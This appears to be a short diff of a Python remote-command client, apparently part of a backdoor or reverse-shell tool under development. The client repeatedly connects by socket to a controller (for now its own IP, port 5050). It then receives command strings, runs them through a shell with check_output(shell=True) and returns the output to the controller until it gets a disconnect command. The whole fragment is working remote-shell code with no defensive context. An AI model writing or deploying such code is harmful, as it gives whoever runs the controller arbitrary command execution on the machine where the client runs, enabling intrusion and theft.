@@ -20,12 +20,16 @@ while True:
         try:
             #using this computer's IP address temporarily for testing on the same computer
             SOCKET.connect((SELF, 5050))
+            print("connected")
             successful = True
-        if not successful: sleep(300)
+        except:
+            print("no response")
+            sleep(5)
     #active mode (executing commands from the controller)
     while True:
         command = SOCKET.recv(BUFFER_SIZE).decode(FORMAT).split(" ")
-        if command[0] == "exit":
+        if command[0] == "HOST_DISCONNECT":
             break
+        print(command)
         SOCKET.send(check_output(command, shell=True))
 
